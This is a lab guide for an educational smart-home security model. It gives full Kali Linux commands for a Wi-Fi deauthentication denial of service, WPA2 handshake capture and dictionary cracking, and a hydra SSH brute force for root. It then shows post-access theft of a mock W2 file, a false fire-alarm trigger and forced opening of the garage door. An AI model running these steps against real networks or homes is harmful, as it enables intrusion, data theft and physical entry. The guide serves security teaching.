# Instructions for Running Attack Scenarios

__WARNING:__ The following scenarios are intended only for educational purposes for use with this specific Cyberphysical Systems educational tool. Do not try to attempt these attacks on any network for which you do not have __express permission__ to conduct them. Obtaining unauthorized access into any WiFi network is illegal in most countries and you can be prosecuted to the full extent of the law.

## 1. Denial-of-Service (DOS) Attack

A denial-of-service (DOS) attack works by flooding a network with SYN packets without going through the proper three-way handshake authentication to complete the connection. This overloads the network and prevents legitimate users from gaining access.

To run our DOS attack scenario on the model:

1. Boot into Kali Linux.
2. Open up a terminal window and type the command `iwconfig` to view what network cards your machine has available. If you see nothing at this step, you need to properly configure your computer's wireless network card before continuing.
3. Type `airmon-ng check` in the terminal to view any running processes that may interfere with the DOS attack. If any processes come up, use `airmon-ng check kill` to terminate them.
4. Use `airmon-ng start <interface>` where `<interface>` is the name of the wireless card interface from step 2. This will alter the name of the interface going forward, so use `iwconfig` again to view the new name. Typically, it will be the same name as before win 'mon' appended to the end. For future steps, we will refer to this new name as `<interface-mon>`.
5. Now, use the airodump-ng tool to capture the BSSID of the target access point by running `airodump-ng <interface-mon>`. Look through the list of access points, locate the desired target, and copy its BSSID.
6. Note the listed channel for the target access point, and set it to your target channel with `iwconfig <interface-mon> channel <channel#>`
7. Before beginning the attack, connect to the model's WiFi on another device and open the NodeRed dashboard in a web browser and navigate to 192.168.3.1:1880/ui/ to view the dashboard with live webcam view.
8. Run `aireplay-ng -0 0 -a <BSSID> <interface-mon>` to begin the DOS attack. If you check the webcam livestream on the dashboard, once the attack has started the stream will freeze.
9. To stop the attack, in your terminal press Ctrl + c. Once the attack is stopped, after a short delay the webcam stream should resume as normal.
1. To re-enable your computer's wireless capabilities, run `service NetworkManager restart`.

## 2. Sniffing & Cracking WPA2-Protected WiFi Password

WPA/WPA2 is one of the most widely used wireless security protocols in consumer wireless hardware, and is the protocol which provides wireless security in our model. Using a variety of penetration tools on Kali Linux, we are able to obtain the WPA2-encrypted passcode to the network, and then decrypt it. This will allow us to log into the WiFi network without ever being given the passcode itself.

To run this scenario on our model, carry out the following steps:

1. Disconnect from any wireless networks and type `airmon-ng` to list you computer's available wireless cards.
2. To kill any processes which may interfere with the next step, run `airmon-ng check kill` to stop them. 
3. Type `airmon-ng start <interface>` to activate monitor mode for your wireless card, where `<interface>` is the name of your wireless card from step 1. This will change the interface name to something new; this will be referred to as <interface-mon> in future steps.
4. Run airodump-ng with your monitor-mode wireless card with `airodump-ng <interface-mon>` to start listening to wireless traffic on nearby access points. Locate the target network and note it's BSSID and Channel number, and press Ctrl + c to stop the program when done.
5. Run the following command: `airodump-ng -c 10 --bssid <BSSID> -w /root/Desktop/ <interface-mon>`. This will intercept network handshakes necessary for cracking the password and store them on the desktop.
6. Once a client shows up on the network, open a second terminal window and run `aireplay-ng -0 2 -a <Router BSSID> -c <Client BSSID> <interface-mon>` to send deauthentication packets to the client to force a handshake between it and the router. If this is successful, in the other terminal running airodump-ng you will see "WPA handshake:" followed by a string of alphanumerals separated by colons. __This is the protected password.__
7. Stop any running processes from the previous two steps (airodump and aireplay). We will attempt to crack the password using the aircrack-ng utility combined with a robust wordlist. Kali linux comes pre-loaded with a few helpful wordlists, which can be located at /usr/share/wordlists/ . You can test a variety of these lists, but for this example you can use the list located at /usr/share/wordlists/dirb/big.txt  
8. Run `aircrack-ng -a2 -b <Router BSSID> -w /usr/share/wordlists/dirb/big.txt /root/Desktop/*.cap` to begin the cracking attempt. This will only work if the password is contained in the provided word list and may take some time to search. If this does not work, try again with a different list in the wordlists directory, or download a larger one from the internet.
9. If step 8 is successful, you will see "KEY FOUND!" with the key following in brackets. This is the password to the WiFi network.
10. To disable monitor mode and connect to the network, run `service NetworkManager restart` and connect using the newly obtained password.

[Link to Reference Source](http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html)

## 3. Obtaining Root Machine Access via SSH Dictionary Attack

On Unix-based systems, the "root" user is one that has full administrative access and priviledges to all resources on the computer. This provides a high level of capability and customizability, but can be a massive security risk if the wrong person were able to gain root access. In this scenario, we will use a dictionary attack based on a large list of data in order to crack the root password on our Smart Home model.

1. Connect to the same network as the Smart Home. In this case, it is the network for the Onion Omega2. If you have not yet determined the password, obtain it by following scenario 2 above. 
2. To obtain the IP address of the device we want to connect to, in this case the Onion Omega2 powering our Smart Home, run `ifconfig` to determine the internet IP address followed by `sudo nmap -sn <nwk ip>/24` to scan for all IPs connected to the network. Search the output for anything with "Omega" and note its IP address. It should be 192.168.3.1
3. This dictionary attack requires two lists; one for usernames and one for passwords. Since we know we are searching only for the root password, we only need "root" as a username. Create a new file on your Desktop called "users.txt" and put `root` as its only contents.
4. For the list of passwords, you can try out any in the /usr/shared/wordlists/ directory, but as in step 2 we will use the one located at /usr/share/wordlists/dirb/big.txt . If this does not work for you feel free to experiment with others or download new ones from the internet.
5. To begin the attack via SSH, use the hydra command: `hydra -L /root/Desktop/users.txt -P /usr/share/wordlists/dirb/big.txt <Onion IP> ssh` . This will take some time, and may be unsuccessful. Keep trying with multiple password lists.
6. Once the attack is successful and the password is cracked, search the output for the cracked password. Try to log into the Smart Home using ssh: `ssh root@<Onion IP>` and then when prompted enter the password. If this works, congratulations! You now have root access to the Smart Home and may do anything you please.

[Link to Reference Source](https://www.hackingarticles.in/6-ways-to-hack-ssh-login-password/)
 
## 4. Using Unauthorized Access to Steal Information and Break Into 

Once an intruder has obtained root access to any computer system, they have full priviledges to view, modify, and execute code on the system. In this scenario, the level of influence an infiltrator could have in this way is demonstrated through the theft of sensitive information from the smart home network, manipulation of hardware components within the system from the attacking machine, and even obtaining physical access inside of the home by forced opening of the garage component.

### Part 1 - Information Theft
1. If not completed already, work through the previous scenarios to obtain root access into the smart home system.
2. Use the `ls` command on the terminal to view the structure of the smart home system. It should contain the directory named `ProjectSmartHome`. As the name suggests, this is where all of the software running the system resides. Go into this directory with the command `cd ProjectSmartHome`.
3. At this point, an attacker can go anywhere in the entire system's software architecture to view, steal, or manipulate any part of the system. For this scenario, first we will steal mock confidential financial documents from the server. From a hacker's perspective, this requires some intuition in navigating the file system to determine where these files might be contained. Use `cd Documents/Financial` to navigate to the directory containing mock user financial information.
4. In this directory there should be a file called 'W2-Private.pdf'. As the name may imply, this is a mock W2 Wage and Tax Statement, a common income tax document in the United States. This document is only intended to be seen by those who absolutely need it, usually limited to the individual, their employer, and the government. It contains sensitive information about the person including their address, their employer and their addess, their income, and more. A hacker can obtain a wealth of valuable information from this. To steal and view this file for yourself, simply copy it over the ssh connection. 
	+ Use `pwd` to obtain the full path to the file, and copy this output.
	+ Terminate the current ssh connection with `exit`.
	+ Use the scp command to copy the file as such: `scp root@192.168.3.1:<output from pwd step>/W2-Private.pdf ~` to copy the file to your local system's home directory. You may be required to re-enter the root password when doing this step.
5. View the stolen W2 file in your local machine's home directory. If the last step was a success, you should be able to open and view it as a PDF simply by double-clicking on it, or opening it otherwise in your preferred PDF reader program.
 
### Part 2 - False trigger of Hardware Components - Fire Alarm

1. Reconnect to the smart home as root using ssh. 
2. Navigate to the directory named `pyPrograms`. As the name implies, this is where all of the programs which oversee operation of the smart home ecosystem reside, written in the popular Python programming language. In fact, this language is the second most used programming language, according to the [2019 Stack Overflow Developer Survey.](https://insights.stackoverflow.com/survey/2019) Additionally, one of its most common uses is for automation, so it is highly likely that in a real-life cyber intrusion scenario that the system is running Python at some level.
3. Navigate into the 'buzzer' directory. This is where the code handling the operation of the fire alarm buzzer is contained.
4. To activate the buzzer, simply run the Python code contained in the file 'turnOnF.py' by executing `python turnOnF.py`. You should hear the system beep as the fire alarm is activated.
5. In this activity, it is demonstrated how easily hardware connected to a smart home environment can be manipulated if it is not properly secured. In the real world, if this were to happen, the family may instinctively run outside of their home and be put into danger due to the false trigger of a fire alarm.

### Part 3 - Forced Entry via Connected Garage Door

1. Navigate back to the 'pyPrograms' directory, and use `ls` to view its contents once again.
2. Navigate into the 'Motor' directory. This contains all of the programs associated with operating the garage door's motor control.
3. Much like how software development is typically structured, the names of these files themselves are descriptive enough to understand their function in the given context. If this was not the case, a close investigation within the code to analyze and determine their functionality would be necessary, but still quite simple. View the contents of of the programs 'open.py' and 'close.py' by running `cat <filename> to see how this is determined.
4. To force the garage door to open without needing access to the smart home HMI, run `python open.py`. You should see the garage door open after a short delay.
5. The door will remain open indefinitely in this manner. To close it, run `python close.py` and it will shut itself.

In conclusion, the three components of this final scenario demonstrate both how simple and powerful it is to access and manipulate restricted aspects of a smart home system once root access is obtained. A malicious party could use this to steal highly sensitive information, manipulate the various components of your IoT connected smart home devices, and even gain direct physical access into your home. This is why it is imperative to be aware of these potential pitfalls and ensure that these smart home systems are implemented with high levels of both software and hardware security measures and failsafes.
